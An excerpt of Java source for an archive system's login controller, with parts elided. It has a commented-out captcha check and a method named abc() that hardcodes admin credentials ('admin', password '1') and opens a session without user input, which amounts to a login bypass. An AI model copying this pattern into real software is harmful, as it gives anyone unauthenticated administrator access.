...
import com.fh.amstools.FileIfArchiveCount;
import com.fh.amstools.GetStatistics;
...
public class LoginController extends BaseController {
	...
	public Object login()throws Exception{
		...
		pd = this.getPageData();
		String errInfo = "";
		String KEYDATA[] = pd.getString("KEYDATA").replaceAll("ccyy", "").replaceAll("aogic", "").split(",ams,");
...
/*			if(Tools.notEmpty(sessionCode) && sessionCode.equalsIgnoreCase(code)){		//判断登录验证码  项目完结时放开
...
/*				}else{
	...
	public ModelAndView defaultPage() throws Exception{
		...
		//通过查询文件表 按IFARCHIVE统计成果和档案总数
		List<PageData> arpds = fileService.arCountlistPage();
		GetStatistics getdata = new GetStatistics();
		FileIfArchiveCount fiac = getdata.getFileIfArchiveCount(arpds);
		
		
		pd.put("ar1", fiac.getArc1Count());				//成果数
		pd.put("ar4", fiac.getArc4Count());				//待分类成果数
		pd.put("ar5", fiac.getArc5Count());				//档案数
		pd.put("appUserCount", Integer.parseInt(appuserService.getAppUserCount("").get("appUserCount").toString()));	//会员数
	...
	public Object abc()throws Exception{
		...
		pd = this.getPageData();
		pd.put("KEYDATA","ccyyadmin,ams,1aogic,ams,1");
		String errInfo = "";
		String KEYDATA[] = pd.getString("KEYDATA").replaceAll("ccyy", "").replaceAll("aogic", "").split(",ams,");
		if(null != KEYDATA && KEYDATA.length == 3){
			Session session = Jurisdiction.getSession();
